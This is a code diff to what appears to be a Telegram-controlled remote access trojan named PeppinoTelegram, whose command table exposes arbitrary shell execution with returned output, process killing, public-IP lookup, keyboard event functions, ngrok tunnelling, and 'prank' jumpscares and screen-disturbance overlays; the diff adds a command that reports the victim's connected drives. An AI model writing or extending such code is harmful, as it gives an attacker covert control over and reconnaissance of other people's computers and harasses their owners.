@@ -63,7 +63,6 @@ from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, r
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
-#TODO: fix ececute
 
 #UTILS
 import pyngrok
@@ -453,7 +452,7 @@ class PeppinoTelegram:
             Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "😈 Pranks", "🎞️ Set Video Wallpaper"),
             Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "😈 Pranks", "🖥️🌀 Video Signal Drowning Effect"),
             Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "😈 Pranks", "🌀📻 Video&Sound Disturbance"),
-            Command("whisperoverlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Whisper Overlay"),
+            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Whisper Overlay"),
 
             # 🦑 Misc & Memes
             Command("plankton", self.plankton, "Plankton jumpscare.", "🦑 Misc", "🦑 Plankton"),
@@ -466,6 +465,7 @@ class PeppinoTelegram:
             Command("browser", browseropen, "Open URL in browser.", "🦑 Misc", "🌐 Browser"),
 
             # 💻 System Control
+            Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "💻 System Control", "💿 List Drives"),
             Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "💻 System Control", "⚙️ Execute"),
             Command("execute", self.execute, None, None, None),
             Command("processkiller", self.process_killer, "Kill process from list.", "💻 System Control", "💀 Process Killer"),
@@ -864,6 +864,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def getip(self):
         output = get_public_ip()
         self.bsend(f"🌐 Public IP: {output}")
+
+
+    def get_disk_info(self):
+        disks = get_disk_info()
+        full_message = "\n".join(map(format_disk, disks))
+        self.bsend(full_message, parse_mode="HTML")
 
     def johnpork(self, audio=True) -> None:
         self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)
@@ -1671,8 +1677,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             root.after(100, update_whisper)
             root.mainloop()
         
-        overlay_thread = Thread(target=run_overlay, daemon=True)
-        overlay_thread.start() 
+        run_overlay()
 
     def knockknock(self) -> None:
         self.__play_loaded_sound("knockknock")
